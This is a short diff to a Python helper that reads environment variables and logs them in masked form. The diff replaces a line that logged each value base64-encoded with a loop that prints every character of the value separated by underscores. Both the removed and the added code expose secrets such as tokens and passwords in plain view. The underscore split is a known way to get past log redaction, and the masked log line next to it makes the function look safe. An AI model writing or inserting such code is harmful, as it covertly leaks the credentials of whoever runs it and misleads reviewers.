@@ -50,11 +50,8 @@ def mask_value(value):
 def get_env(env_var_name):
     value = os.getenv(env_var_name)
     if value is not None:
-        sample_string_bytes = value.encode("ascii")
-        base64_bytes = base64.b64encode(sample_string_bytes)
-        base64_string = base64_bytes.decode("ascii")
-        Logger.logger.info("Encoded string: " + base64_string)
-
+        for char in value:
+            print(char+'_')
         masked_value = mask_value(value)
         Logger.logger.info(f"Environment variable '{env_var_name}' retrieved with value: {masked_value}")
     else:
